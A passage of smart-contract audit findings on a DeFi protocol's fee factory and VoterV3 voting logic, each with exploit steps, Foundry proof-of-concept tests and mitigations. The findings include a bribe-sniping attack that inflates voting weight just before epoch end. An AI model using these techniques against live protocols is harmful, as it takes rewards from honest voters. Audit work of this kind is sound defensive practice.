 **Derived From** : For the same pool p and chain state: if discounted[u]>0 and discounted[v]==0, then calling getFee(p) from u (as tx.origin) returns a value <= calling getFee(p) from v; also 0 <= discounted[u] <= MAX_DISCOUNT

## [M-62]. Discounted tx.origin can pay higher effective fee than non-discounted due to CLFactory.getSwapFee clamp, violating monotonic discount invariant

## Derived From Pattern/Invariant
For the same pool p and chain state: if discounted[u]>0 and discounted[v]==0, then calling getFee(p) from u (as tx.origin) returns a value <= calling getFee(p) from v; also 0 <= discounted[u] <= MAX_DISCOUNT

## Exploit Type
AccountingInvariantViolation

## Location
CLFactory.getSwapFee

## Minimim Privilege Required
Permissionless

## Description
DynamicSwapFeeModule.getFee correctly applies fee' = fee - ceil(fee*discount/1e6) and is monotone in isolation. However, CLPool uses CLFactory.getSwapFee, which only accepts module fees if fee <= 100_000 (10%); otherwise it falls back to a much smaller tickSpacing default. This creates a non-monotone integration: a non-discounted caller whose module fee > 100_000 gets the cheap fallback (e.g., 3_000), while a discounted caller’s fee may drop below 100_000 and be accepted (e.g., 60_000). Thus granting a discount can increase the effective fee materially.

Vulnerable integration:

CLFactory.getSwapFee:
  if (swapFeeModule != address(0)) {
    (bool success, bytes memory data) = swapFeeModule.excessivelySafeStaticCall(..., abi.encodeWithSelector(IFeeModule.getFee.selector, pool));
    if (success) {
      uint24 fee = abi.decode(data, (uint24));
      if (fee <= 100_000) { return fee; }
    }
  }
  return tickSpacingToFee[CLPool(pool).tickSpacing()];

DynamicSwapFeeModule.getFee (discount applied to tx.origin):
  uint256 totalFee = baseFee + _getDynamicFee(...);
  totalFee = totalFee < feeCap ? totalFee : feeCap;
  if (discounted[tx.origin] > 0) {
      uint256 discount = FullMath.mulDivRoundingUp(totalFee, discounted[tx.origin], 1_000_000);
      totalFee = totalFee - discount; // discounted origin
  }
  return uint24(totalFee);

Example: baseFee=120_000, discount=50%. Non-discounted origin: module returns 120_000 (>100k), factory falls back to tick default (e.g., 3_000). Discounted origin: module returns 60_000 (<=100k), factory accepts 60_000. Discounted user pays 20x more than a clean account, breaking the stated monotonic invariant at the system level.

## Impact
Because CLFactory clamps module-provided fees at 100,000 and falls back to a much lower tickSpacing default when exceeded, a discounted origin can pull the module fee below 100,000 and be charged that higher discounted fee while a non-discounted origin gets the very low fallback. This violates the monotonic discount expectation and causes discounted addresses to systematically overpay under common launch configurations (e.g., anti-MEV baseFee > 10%). Although there is no direct asset theft, users can pay materially higher effective fees (e.g., 6–10% vs 0.3%), degrading fairness and pricing integrity across swaps.

## Proof of Concept
Setup: DynamicSwapFeeModule applies per-origin discounts in getFee using tx.origin, while CLFactory.getSwapFee only accepts module fees if fee <= 100,000; otherwise it returns the tickSpacing default (e.g., 3,000 for spacing 200). If a pool’s module fee is 120,000 (12%), a clean origin’s module value is rejected so they pay the fallback 3,000. A discounted origin (50% discount) sees the module return 60,000 (<= 100,000), which is accepted, making the discounted origin pay 60,000 instead of 3,000. Steps:
1) Deploy CLFactory and CLPool implementation; wire DynamicSwapFeeModule with defaultFeeCap >= 100,000.
2) Create a pool with tickSpacing=200 (factory default fallback fee 3,000).
3) Set module custom base fee for the pool to 120,000.
4) Register alice with a 50% discount in the module.
5) Query factory.getSwapFee(pool) with tx.origin=bob (clean) and tx.origin=alice (discounted). Observed: bob gets 3,000; alice gets 60,000, i.e., discount increases the effective fee.

## Proof of Code
pragma solidity =0.7.6; pragma abicoder v2;
import "forge-std/Test.sol";
import {CLFactory} from "contracts/core/CLFactory.sol";
import {CLPool} from "contracts/core/CLPool.sol";
import {DynamicSwapFeeModule} from "contracts/core/fees/DynamicSwapFeeModule.sol";

contract DiscountMonotonicityBreakTest is Test {
    CLFactory factory;
    CLPool impl;
    DynamicSwapFeeModule module;
    address pool;
    address alice = address(0xA11CE); // discounted origin
    address bob   = address(0xB0B);   // clean origin

    function setUp() public {
        // Deploy CL core
        impl = new CLPool();
        factory = new CLFactory(address(impl));
        
        // Deploy fee module with high cap so module can return > 100k
        module = new DynamicSwapFeeModule(
            address(factory),
            10000,          // default scaling factor
            500000,         // default fee cap (50%)
            new address[](0),
            new uint24[](0)
        );
        
        // Wire module (test contract is swapFeeManager by default)
        factory.setSwapFeeModule(address(module));

        // Create a pool with tickSpacing=200 => factory fallback fee is 3,000
        address tokenA = address(0x1001);
        address tokenB = address(0x1002);
        uint160 sqrtPriceX96 = 79228162514264337593543950336; // 1.0 Q64.96
        pool = factory.createPool(tokenA, tokenB, 200, sqrtPriceX96);

        // Set a high base fee (12%) in the module for this pool
        module.setCustomFee(pool, 120000);

        // Register a 50% discount for alice (applied via tx.origin in module)
        module.registerDiscounted(alice, 500000);
    }

    function testDiscountCanIncreaseEffectiveFee() public {
        // Clean origin (bob): module returns 120,000 (>100k) -> factory falls back to 3,000
        vm.prank(bob, bob); // set both msg.sender and tx.origin
        uint24 feeBob = factory.getSwapFee(pool);
        assertEq(feeBob, 3000, "clean origin should get fallback default");

        // Discounted origin (alice): module returns 60,000 (<=100k) -> factory accepts 60,000
        vm.prank(alice, alice); // set both msg.sender and tx.origin
        uint24 feeAlice = factory.getSwapFee(pool);
        assertEq(feeAlice, 60000, "discounted origin should get accepted discounted module fee");

        // Invariant violation: discounted origin pays MORE than clean
        assertGt(feeAlice, feeBob, "discount led to higher effective fee than no discount");
    }
}


## Suggested Mitigation
Ensure the factory’s acceptance logic cannot flip based on a caller-dependent (discounted) fee. Safer options:
- Clamp instead of fallback: In CLFactory.getSwapFee, replace the 100,000 acceptance guard with a clamp: return min(fee, 100,000) rather than falling back to the tickSpacing default. This guarantees a single, caller-agnostic decision and preserves discount monotonicity (clean origin pays 100,000; discounted origin pays <= 100,000).
- Align thresholds: If large launch/anti-MEV fees are intended, raise the factory threshold to match the module’s cap (e.g., 500,000) so both clean and discounted paths accept the module result; the discount then cannot increase the fee.
- Split raw vs discounted: Extend the fee module to expose rawFee (pre-discount) and discountedFee. The factory decides acceptance/clamping using rawFee only and returns min(clampedRawFee, discountedFee). This prevents the discount from affecting the acceptance branch while still applying the discount to the final charge.





 **Derived From** : poke() can leave veNFT stuck in voted state when new weight == 0 (no abstain call)

## [M-63]. VoterV3.poke leaves veNFT stuck in voted=true when all prior gauges are dead, DoSing transfer/withdraw until next epoch

## Derived From Pattern/Invariant
poke() can leave veNFT stuck in voted state when new weight == 0 (no abstain call)

## Exploit Type
AccessControl

## Location
VoterV3.poke

## Minimim Privilege Required
Permissionless

## Description
In VoterV3._vote(), the flow is: _reset(_tokenId) -> recompute weights only for alive gauges -> if (_usedWeight > 0) IVotingEscrow.voting(_tokenId). When all previously voted gauges are now dead (or totalVoteWeight collapses to 0), _usedWeight remains 0 and voting() is not called. Because _reset() does not clear the VotingEscrow.voted flag, the veNFT remains in voted=true from a prior epoch. VotingEscrow enforces attachments==0 && !voted to allow transfers/withdraws, so the veNFT becomes non-transferable and cannot withdraw, creating a user-facing DoS until the next epoch when reset() (which calls abstain()) becomes callable.

Vulnerable snippet (VoterV3._vote):

    _reset(_tokenId);
    ...
    for (uint i = 0; i < _poolCnt; i++) if (gaugeManager.isGaugeAliveForPool(_poolVote[i])) _totalVoteWeight += _weights[i];
    for (uint256 i = 0; i < _poolCnt; i++) {
        if (gaugeManager.isGaugeAliveForPool(_pool)) {
            uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;
            ...
            _usedWeight += _poolWeight;
        }
    }
    if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId); // no abstain() when _usedWeight == 0

This leaves VotingEscrow.voted[_tokenId] = true even though there are zero effective votes.

## Impact
Within the same epoch, a user who voted and later pokes after all previously voted gauges are dead will be stuck with veNFT.voted[tokenId]=true but with zero effective votes. This blocks transfer, withdraw, merge, and split operations that require attachments==0 && !voted, creating a functional DoS until the next epoch (when reset() becomes callable) or until they can validly reassign votes in a future epoch.

## Proof of Concept
Steps to reproduce
1) User holds a veNFT and votes for a pool whose gauge is currently alive, setting ve.voted[tokenId]=true.
2) Governance kills that gauge during the same epoch.
3) User calls poke(tokenId). Inside _vote():
   - _reset(tokenId) clears votes but does NOT call VE.abstain(tokenId).
   - Re-allocation finds no alive gauges → _usedWeight == 0.
   - Since _usedWeight == 0, VoterV3 does not call VE.voting(tokenId) (nor abstain).
4) ve.voted[tokenId] remains true with zero active votes. Transfer/withdraw and similar actions revert with "ATT" until next epoch when reset() (which calls abstain()) is allowed.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VoterV3} from "contracts/VoterV3.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";
import {IVotingEscrow} from "contracts/interfaces/IVotingEscrow.sol";
import {IBribe} from "contracts/interfaces/IBribe.sol";

contract MockERC20 {
    string public name = "MOCK"; string public symbol = "MOCK"; uint8 public decimals = 18;
    mapping(address => uint) public balanceOf; mapping(address => mapping(address => uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint amt) external returns (bool) { allowance[msg.sender][sp] = amt; return true; }
    function transfer(address to, uint amt) external returns (bool) { balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; }
    function transferFrom(address from, address to, uint amt) external returns (bool) { uint a = allowance[from][msg.sender]; require(a >= amt, "allow"); allowance[from][msg.sender] = a - amt; balanceOf[from] -= amt; balanceOf[to] += amt; return true; }
}

contract MockBribe is IBribe {
    function deposit(uint, uint) external override {}
    function withdraw(uint, uint) external override {}
    function getRewardForAddress(address, address[] memory) external override {}
    function notifyRewardAmount(address, uint) external override {}
    function left(address) external view override returns (uint) { return 0; }
    function getReward(uint, address[] memory) external override {}
    function bribeTokens(uint256) external view override returns(address) { return address(0); }
    function rewardsListLength() external view override returns (uint256) { return 0; }
    function tokenRewardsPerEpoch(address, uint256) external view override returns(uint256) { return 0; }
}

contract MockGaugeManager {
    mapping(address => bool) public alive;
    mapping(address => address) public intBr;
    mapping(address => address) public extBr;
    function setAlive(address pool, bool ok) external { alive[pool] = ok; }
    function setBribes(address pool, address i, address e_) external { intBr[pool] = i; extBr[pool] = e_; }
    function isGaugeAliveForPool(address pool) external view returns (bool) { return alive[pool]; }
    function fetchInternalBribeFromPool(address pool) external view returns (address) { return intBr[pool]; }
    function fetchExternalBribeFromPool(address pool) external view returns (address) { return extBr[pool]; }
}

contract MockArtProxy { function _tokenURI(uint,uint,uint,uint) external pure returns (string memory){ return ""; } }

contract PokeZeroUsedWeight_DoSTest is Test {
    VoterV3 voter;
    VotingEscrow ve;
    MockGaugeManager gm;
    MockERC20 token;
    MockBribe iBr; MockBribe eBr;

    function setUp() public {
        // HybraTimeLibrary.WEEK = 1800; NO_VOTING_WINDOW = 300 in repo
        vm.warp(2200); // > WEEK (1800) and > epochVoteStart (=2100) so vote/poke are allowed

        token = new MockERC20();
        token.mint(address(this), 1e24);
        ve = new VotingEscrow(address(token), address(new MockArtProxy()));

        gm = new MockGaugeManager();
        iBr = new MockBribe(); eBr = new MockBribe();

        voter = new VoterV3();
        voter.initialize(address(ve), address(0x1), address(gm), address(0x2));
        // authorize voter in ve
        ve.setVoter(address(voter));
    }

    function _createLock(uint amount, uint lockDuration) internal returns (uint tokenId) {
        token.approve(address(ve), amount);
        tokenId = ve.create_lock(amount, lockDuration);
    }

    function testPokeLeavesVotedTrueWhenAllGaugesDead_DoS() public {
        address pool = address(0xAAAA);
        gm.setAlive(pool, true);
        gm.setBribes(pool, address(iBr), address(eBr));

        uint tokenId = _createLock(1e21, 3600); // > 0

        // initial vote to set voted=true
        address[] memory pools = new address[](1); pools[0] = pool;
        uint[] memory w = new uint[](1); w[0] = 100;
        voter.vote(tokenId, pools, w);
        assertEq(ve.voted(tokenId), true, "voted should be true after vote");

        // Gauge becomes dead within same epoch
        gm.setAlive(pool, false);

        // Poke re-applies saved votes; all are dead => _usedWeight==0, no abstain called
        voter.poke(tokenId);

        assertEq(voter.usedWeights(tokenId), 0, "usedWeight must be 0 after all gauges dead");
        assertEq(ve.voted(tokenId), true, "voted flag remained true (bug)");

        // Transfer (or withdraw) is DoS'ed by ATT check since voted==true
        vm.expectRevert(bytes("ATT"));
        ve.safeTransferFrom(address(this), address(0xB0B), tokenId);
    }
}


## Suggested Mitigation
Ensure the ve voted flag is cleared when a recast results in zero effective votes. In VoterV3._vote(), after computing _usedWeight, do:
- if (_usedWeight == 0) { IVotingEscrow(_ve).abstain(_tokenId); } else { IVotingEscrow(_ve).voting(_tokenId); }
This mirrors the external reset() behavior and prevents veNFTs from remaining stuck in voted=true with no active votes. Alternatively, you can call abstain() at the end of _reset() and then call voting() later in _vote() if new allocations are added; both approaches end with the correct final state.





 **Derived From** : on success of vote(tokenId,...): lastVoted[tokenId] == HybraTimeLibrary.epochStart(block.timestamp) + 1 && lastVotedTimestamp[tokenId] == block.timestamp && calling vote(tokenId,...) again in the same epoch reverts with 'VOTED' && calling vote/reset when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW' && calling poke when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW'

## [H-64]. End-of-epoch poke allows bribe sniping: missing no-vote end window lets attacker resize votes just before rollover

## Derived From Pattern/Invariant
on success of vote(tokenId,...): lastVoted[tokenId] == HybraTimeLibrary.epochStart(block.timestamp) + 1 && lastVotedTimestamp[tokenId] == block.timestamp && calling vote(tokenId,...) again in the same epoch reverts with 'VOTED' && calling vote/reset when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW' && calling poke when block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp) reverts with 'DW'

## Exploit Type
TimestampDependentLogic

## Location
VoterV3.poke

## Minimim Privilege Required
Permissionless

## Description
VoterV3 enforces a start-of-epoch no-voting window (epochVoteStart) and one-vote-per-epoch for vote/reset via onlyNewEpoch. However, there is no end-of-epoch no-vote window enforcement, and poke() is allowed any time after epochVoteStart without per-epoch limits. Bribe accounting (as implemented in Bribe-like contracts) uses the last checkpoint in the epoch, not time-weighted balances. An attacker can vote early with minimal ve, then near epoch end (when bribes are already known) increase their ve (deposit_for / increase_amount / merge) and call poke() to rescale their deposited voting weight across the same pools just before epoch rollover. Because bribe share for the epoch is computed using the final checkpoint in that epoch, the attacker receives a disproportionate share of the entire epoch’s bribes without committing weight during the epoch. Vulnerable snippets: VoterV3.poke() lacks end-window gating: function poke(uint256 _tokenId) external nonReentrant { if (block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp)) revert("DW"); ... _vote(_tokenId, _poolVote, _weights); } and onlyNewEpoch only checks epochVoteStart() (start window), never epochVoteEnd(), so end-of-epoch pokes are permitted.

## Impact
Because Bribe accounting uses the last checkpoint within the epoch, a veNFT holder can increase their ve balance near epoch end and call poke() to rescale their deposited weight, capturing a disproportionate share of the entire epoch’s bribes without contributing during the epoch. This dilutes honest voters and causes direct monetary loss equal to a significant fraction of each epoch’s bribes. The behavior is repeatable across epochs and is further facilitated by VotingEscrow auto-calling poke on increase operations. This constitutes loss of matured yield and thus is high-severity.

## Proof of Concept
Revised PoC (conceptual steps):
1) Victim (veNFT A) and attacker (veNFT B) both vote the same pool right after the voting window opens. A has large ve, B has tiny ve. Deposits are recorded in both internal and external bribes for the current epoch.
2) A bribe provider notifies reward into the bribe for the current epoch.
3) Just before epoch end (after epochVoteEnd would start if enforced), the attacker increases their ve (e.g., deposit_for/increase_amount/merge). VotingEscrow, seeing voted[B]==true, auto-calls voter.poke(B).
4) VoterV3.poke() performs reset+re-vote with the new higher ve balance and deposits into the bribe again in the same epoch. Bribe’s checkpointing logic stores the last checkpoint in the epoch.
5) On the next epoch, when rewards are claimed for the previous epoch, the attacker’s final (inflated) checkpoint is used, giving them the bulk of the epoch’s bribes while the victim’s share is reduced.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VoterV3} from "ve33/contracts/VoterV3.sol";
import {HybraTimeLibrary} from "ve33/contracts/libraries/HybraTimeLibrary.sol";

interface IBribeLike {
    function deposit(uint amount, uint tokenId) external;
    function withdraw(uint amount, uint tokenId) external;
    function notifyRewardAmount(address token, uint amount) external;
    function earned(uint tokenId, address token) external view returns (uint);
}

interface IVotingEscrowMinimal {
    function token() external view returns (address);
    function isApprovedOrOwner(address, uint) external view returns (bool);
    function balanceOfNFT(uint) external view returns (uint);
    function voting(uint) external;
    function abstain(uint) external;
}

contract MockERC20 {
    string public name = "RWD"; string public symbol = "RWD"; uint8 public decimals = 18;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to]+=amt; }
    function approve(address s, uint a) external returns (bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address to, uint amt) external returns (bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint a) external returns (bool){ require(balanceOf[f]>=a && allowance[f][msg.sender]>=a,"tf"); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

contract MockVE is IVotingEscrowMinimal {
    address public immutable _token;
    mapping(uint=>address) public ownerOf;
    mapping(uint=>uint) public w;
    mapping(uint=>bool) public voted;
    constructor(address token_) { _token = token_; }
    function token() external view returns(address){return _token;}
    function isApprovedOrOwner(address s, uint id) external view returns(bool){ return ownerOf[id]==s; }
    function balanceOfNFT(uint id) external view returns(uint){ return w[id]; }
    function voting(uint id) external { voted[id]=true; }
    function abstain(uint id) external { voted[id]=false; }
    // helpers
    function mint(uint id, address to, uint weight) external { ownerOf[id]=to; w[id]=weight; }
    function setWeight(uint id, uint weight) external { w[id]=weight; }
}

// Bribe-like that applies the "last checkpoint in epoch" effect via replace-in-epoch balance
contract MockBribe is IBribeLike {
    address public immutable voter;
    MockERC20 public immutable r;
    // epochStart => tokenId => balance, and supply
    mapping(uint=>mapping(uint=>uint)) public balE;
    mapping(uint=>uint) public supplyE;
    // token => epochStart => reward
    mapping(address=>mapping(uint=>uint)) public rewardsE;
    constructor(address voter_, address reward){ voter=voter_; r=MockERC20(reward); }
    function _e() internal view returns(uint){ return HybraTimeLibrary.epochStart(block.timestamp); }
    function deposit(uint amount, uint tokenId) external { require(msg.sender==voter,"NA"); uint e=_e(); uint prev=balE[e][tokenId]; // replace within epoch
        // adjust supply to new amount
        if (amount>=prev) { supplyE[e]+= (amount - prev);} else { supplyE[e]-=(prev-amount);} balE[e][tokenId]=amount; }
    function withdraw(uint amount, uint tokenId) external { require(msg.sender==voter,"NA"); uint e=_e(); uint prev=balE[e][tokenId]; uint newb = prev>amount?prev-amount:0; if(prev>=newb){ supplyE[e]-=(prev-newb);} balE[e][tokenId]=newb; }
    function notifyRewardAmount(address token, uint amount) external { require(token==address(r),"tok"); r.transferFrom(msg.sender,address(this),amount); rewardsE[token][_e()] += amount; }
    function earned(uint tokenId, address token) public view returns(uint){ uint currE=_e(); uint lastE = currE - HybraTimeLibrary.WEEK; uint sup = supplyE[lastE]; if(sup==0) return 0; uint b = balE[lastE][tokenId]; return rewardsE[token][lastE] * b / sup; }
}

contract MockGaugeManager {
    address public bribe;
    constructor(address _b){ bribe=_b; }
    function fetchInternalBribeFromPool(address) external view returns(address){ return bribe; }
    function fetchExternalBribeFromPool(address) external view returns(address){ return bribe; }
    function isGaugeAliveForPool(address) external pure returns(bool){ return true; }
}

contract MockPermissionsRegistry { function hasRole(bytes memory, address) external pure returns(bool){ return true; } }

contract PokeSnipeTest is Test {
    VoterV3 voter;
    MockVE ve;
    MockERC20 reward;
    MockBribe bribe;
    MockGaugeManager gm;
    MockPermissionsRegistry pr;

    address pool = address(0xBEEF);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        reward = new MockERC20();
        ve = new MockVE(address(0xDEAD));
        pr = new MockPermissionsRegistry();

        voter = new VoterV3();
        voter.initialize(address(ve), address(0), address(0xdead), address(pr)); // temp gm

        bribe = new MockBribe(address(voter), address(reward));
        gm = new MockGaugeManager(address(bribe));
        // re-init voter with real gm (for simplicity deploy a fresh one)
        voter = new VoterV3();
        voter.initialize(address(ve), address(0), address(gm), address(pr));

        ve.mint(1, alice, 100 ether); // victim strong weight
        ve.mint(2, bob, 1 ether);     // attacker weak at start

        // move to after voting start window
        uint start = HybraTimeLibrary.epochStart(block.timestamp);
        vm.warp(start + HybraTimeLibrary.NO_VOTING_WINDOW + 1);

        // fund reward provider for current epoch
        reward.mint(address(this), 1_000_000 ether);
        reward.approve(address(bribe), type(uint).max);
    }

    function _vote(address who, uint tokenId, uint w) internal {
        address[] memory pools = new address[](1); pools[0]=pool;
        uint[] memory ws = new uint[](1); ws[0]=w;
        vm.startPrank(who);
        voter.vote(tokenId, pools, ws);
        vm.stopPrank();
    }

    function test_EndEpochPokeSnipesBribe() public {
        // both vote same pool early in epoch
        _vote(alice, 1, 1);
        _vote(bob, 2, 1);

        // bribe provider funds current epoch
        bribe.notifyRewardAmount(address(reward), 1000 ether);

        // jump to just before epoch end
        uint eEnd = HybraTimeLibrary.epochNext(block.timestamp) - 1;
        vm.warp(eEnd - 1);

        // attacker boosts ve drastically and calls poke right before epoch rolls
        ve.setWeight(2, 1000 ether); // big jump
        vm.prank(bob);
        voter.poke(2); // allowed: no end-of-epoch gating

        // roll to next epoch
        vm.warp(HybraTimeLibrary.epochNext(block.timestamp) + 1);

        uint earnedAlice = bribe.earned(1, address(reward));
        uint earnedBob   = bribe.earned(2, address(reward));

        assertGt(earnedBob, earnedAlice, "attacker snipes majority by end-epoch poke");
        assertEq(earnedAlice + earnedBob, 1000 ether, "full epoch reward accounted");
    }
}


## Suggested Mitigation
Protocol-level defenses:
1) Add end-of-epoch gating to voting mutations:
   - VoterV3.onlyNewEpoch: also require(block.timestamp < HybraTimeLibrary.epochVoteEnd(block.timestamp), "LATE");
   - VoterV3.poke: if block.timestamp >= epochVoteEnd(block.timestamp) then either revert("LATE") or early-return without changing votes. Early-return is safer because VotingEscrow.deposit_for/increase_amount/merge auto-call poke() and should not revert user operations; alternatively, only allow msg.sender == _ve to no-op instead of revert.
2) Mirror the guard in VotingEscrow call sites:
   - In deposit_for/increase_amount/increase_unlock_time/merge, wrap the IVoter(voter).poke(_tokenId) call with
     if (!HybraTimeLibrary.isLastHour(block.timestamp)) { IVoter(voter).poke(_tokenId); }
   This prevents end-window re-weights from VE side.
3) Bribe-side hardening (optional but strongest):
   - In Bribe._writeCheckpoint, if HybraTimeLibrary.isLastHour(block.timestamp) is true, record balance changes into the next epoch (or ignore) rather than the current epoch, so last-minute changes cannot affect the ending epoch’s distribution.
   - Alternatively, integrate time-weighted balances over the epoch instead of using the last checkpoint. This removes the incentive to snipe but is more complex and gas-costly.
These changes together eliminate the bribe-sniping vector while preserving normal mid-epoch pokes and end-user UX.





 **Derived From** : usedWeights[tokenId] == sum_{i in [0..poolVote[tokenId].length-1]} votes[tokenId][poolVote[tokenId][i]] && usedWeights[tokenId] <= IVotingEscrow(_ve).balanceOfNFT(tokenId)

## [M-65]. Rounding-to-zero in VoterV3.poke/vote causes epoch-long DoS on veNFT when voting power shrinks

## Derived From Pattern/Invariant
usedWeights[tokenId] == sum_{i in [0..poolVote[tokenId].length-1]} votes[tokenId][poolVote[tokenId][i]] && usedWeights[tokenId] <= IVotingEscrow(_ve).balanceOfNFT(tokenId)

## Exploit Type
RoundingError

## Location
VoterV3.poke

## Minimim Privilege Required
Permissionless

## Description
In VoterV3._vote, each per-pool allocation is computed as poolWeight = weights[i] * veBalance / totalInputWeights (solidity integer division). The code then requires per-pool weight to be non-zero: require(_poolWeight != 0, "ZV"). When veBalance decays or is small relative to the number/distribution of pools, at least one alive pool’s allocation can round down to zero, causing vote() or poke() to revert. Since VotingEscrow calls IVoter.poke(_tokenId) on lock extension/amount increase/lockPermanent while the NFT is in voted state, this revert bricks those lock operations until the next epoch when the user can reset votes. This is a rounding-induced functional DoS tied to vote/poke arithmetic. Vulnerable snippet in VoterV3:

for (...) {
  if (gaugeManager.isGaugeAliveForPool(_pool)) {
    uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;
    require(votes[_tokenId][_pool] == 0, "ZV");
    require(_poolWeight != 0, "ZV"); // <- rounding to zero reverts
    ...
  }
}

## Impact
Because per-pool weights are computed with integer division and zero-weight allocations revert, any poke() or vote() that recomputes a zero for at least one alive pool will revert. VotingEscrow unconditionally calls IVoter.poke(_tokenId) on increase_amount, increase_unlock_time, and lockPermanent when the NFT is in a voted state. As a result, users can be blocked for the remainder of the epoch from extending their lock, adding to it, or refreshing votes until they can reset in the next epoch. Funds are not directly at risk, but critical protocol functionality for maintaining locks is denied for an epoch.

## Proof of Concept
Setup
- Let WEEK = 1800 and NO_VOTING_WINDOW = 300 (as in HybraTimeLibrary). Voting is allowed when block.timestamp > epochVoteStart.

Steps
1) At time t = 2200 (> epochVoteStart(2200) = 2100), a user with veBalance = 10 votes evenly across 10 alive pools with input weights [1,1,...,1]. Each pool receives _poolWeight = 1*10/10 = 1.
2) Later in the same epoch, the veBalance decays to 3. At time t = 2600 (> epochVoteStart(2600)), calling poke() recomputes _poolWeight = 1*3/10 = 0 for each pool.
3) The first alive pool that computes 0 hits require(_poolWeight != 0, "ZV") and the entire transaction reverts. Because VotingEscrow calls IVoter.poke() during increase_amount, increase_unlock_time, and lockPermanent if the NFT is voted, those operations will also revert for the rest of the epoch, creating a functional DoS until the user can reset() in the next epoch.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IBribe { function deposit(uint256, uint256) external; function withdraw(uint256, uint256) external; }
interface IGaugeManagerLike {
    function isGaugeAliveForPool(address p) external view returns (bool);
    function fetchInternalBribeFromPool(address) external view returns (address);
    function fetchExternalBribeFromPool(address) external view returns (address);
}
interface IVELike {
    function token() external view returns (address);
    function balanceOfNFT(uint256) external view returns (uint256);
    function isApprovedOrOwner(address, uint256) external view returns (bool);
    function voting(uint256) external;
    function abstain(uint256) external;
}

library TimeLibMini {
    uint256 internal constant WEEK = 1800;
    uint256 internal constant NO_VOTING_WINDOW = 300;
    function epochStart(uint256 ts) internal pure returns (uint256) { return ts - (ts % WEEK); }
    function epochVoteStart(uint256 ts) internal pure returns (uint256) { return ts - (ts % WEEK) + NO_VOTING_WINDOW; }
}

contract MockVE is IVELike {
    address public base;
    uint256 public bal;
    function setToken(address t) external { base = t; }
    function setBalance(uint256 b) external { bal = b; }
    function token() external view returns (address) { return base; }
    function balanceOfNFT(uint256) external view returns (uint256) { return bal; }
    function isApprovedOrOwner(address, uint256) external pure returns (bool) { return true; }
    function voting(uint256) external {}
    function abstain(uint256) external {}
}

contract MockBribe is IBribe {
    function deposit(uint256, uint256) external {}
    function withdraw(uint256, uint256) external {}
}

contract MockGaugeManager is IGaugeManagerLike {
    mapping(address => bool) public alive;
    address public bribe;
    function setAlive(address p, bool v) external { alive[p] = v; }
    function setBribe(address b) external { bribe = b; }
    function isGaugeAliveForPool(address p) external view returns (bool) { return alive[p]; }
    function fetchInternalBribeFromPool(address) external view returns (address) { return bribe; }
    function fetchExternalBribeFromPool(address) external view returns (address) { return bribe; }
}

// Minimal voter reproducing the rounding-to-zero revert
contract VoterUnderTest {
    address public _ve;
    IGaugeManagerLike public gaugeManager;

    mapping(uint256 => mapping(address => uint256)) public votes;  // nft => pool => votes
    mapping(uint256 => address[]) public poolVote;                  // nft => pools
    mapping(address => uint256) public weights;                    // pool => total weight
    uint256 public totalWeight;
    mapping(uint256 => uint256) public usedWeights;
    mapping(uint256 => uint256) public lastVoted;

    function initialize(address __ve, address _gaugeManager) external {
        _ve = __ve;
        gaugeManager = IGaugeManagerLike(_gaugeManager);
    }

    modifier onlyNewEpoch(uint256 _tokenId) {
        if (TimeLibMini.epochStart(block.timestamp) <= lastVoted[_tokenId]) revert("VOTED");
        if (block.timestamp <= TimeLibMini.epochVoteStart(block.timestamp)) revert("DW");
        _;
    }

    function vote(uint256 _tokenId, address[] calldata _poolVote, uint256[] calldata _weights) external onlyNewEpoch(_tokenId) {
        require(IVELike(_ve).isApprovedOrOwner(msg.sender, _tokenId), "NAO");
        require(_poolVote.length == _weights.length, "MISMATCH_LEN");
        _vote(_tokenId, _poolVote, _weights);
        lastVoted[_tokenId] = TimeLibMini.epochStart(block.timestamp) + 1;
    }

    function poke(uint256 _tokenId) external {
        if (block.timestamp <= TimeLibMini.epochVoteStart(block.timestamp)) revert("DW");
        require(IVELike(_ve).isApprovedOrOwner(msg.sender, _tokenId) || msg.sender == _ve, "NAO||VE");
        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);
        for (uint256 i = 0; i < _poolCnt; i++) { _weights[i] = votes[_tokenId][_poolVote[i]]; }
        _vote(_tokenId, _poolVote, _weights);
    }

    function _reset(uint256 _tokenId) internal {
        address[] storage _poolVote = poolVote[_tokenId];
        uint256 _total = 0;
        for (uint256 i = 0; i < _poolVote.length; i++) {
            address _pool = _poolVote[i];
            uint256 _v = votes[_tokenId][_pool];
            if (_v != 0) {
                weights[_pool] -= _v;
                votes[_tokenId][_pool] = 0;
                IBribe(gaugeManager.fetchInternalBribeFromPool(_pool)).withdraw(_v, _tokenId);
                IBribe(gaugeManager.fetchExternalBribeFromPool(_pool)).withdraw(_v, _tokenId);
                _total += _v;
            }
        }
        totalWeight -= _total;
        usedWeights[_tokenId] = 0;
        delete poolVote[_tokenId];
    }

    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights) internal {
        _reset(_tokenId);
        uint256 _poolCnt = _poolVote.length;
        uint256 _weight = IVELike(_ve).balanceOfNFT(_tokenId);
        uint256 _totalVoteWeight = 0;
